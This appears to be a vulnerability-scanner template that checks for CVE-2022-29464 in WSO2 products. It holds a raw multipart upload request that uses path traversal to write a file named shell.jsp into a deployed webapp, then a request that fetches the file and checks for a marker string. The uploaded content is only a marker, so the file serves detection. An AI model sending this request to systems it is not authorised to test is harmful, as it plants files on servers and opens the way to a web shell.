id: WSO2-upload
info:
  author: str1am
  name: "WSO2\u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20"
  reference:
  - https://github.com/hakivvi/CVE-2022-29464/blob/main/exploit.py
  severity: critical
  tags: WSO2,upload
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - 202cb962ac59075b964b07152d234b70
  matchers-condition: and
  raw:
  - 'POST /fileupload/toolsAny HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101
    Firefox/92.0

    Accept-Encoding: gzip, deflate

    Accept: */*

    Connection: close

    Content-Length: 300

    Content-Type: multipart/form-data; boundary=7e4e89afc5a9aee581a5ab27fc7abf8f


    --7e4e89afc5a9aee581a5ab27fc7abf8f

    Content-Disposition: form-data; name="../../../../repository/deployment/server/webapps/authenticationendpoint/shell.jsp";
    filename="../../../../repository/deployment/server/webapps/authenticationendpoint/shell.jsp"



    202cb962ac59075b964b07152d234b70


    --7e4e89afc5a9aee581a5ab27fc7abf8f--

    '
  - 'GET /authenticationendpoint/shell.jsp HTTP/1.1

    Host: {{Hostname}}

    '
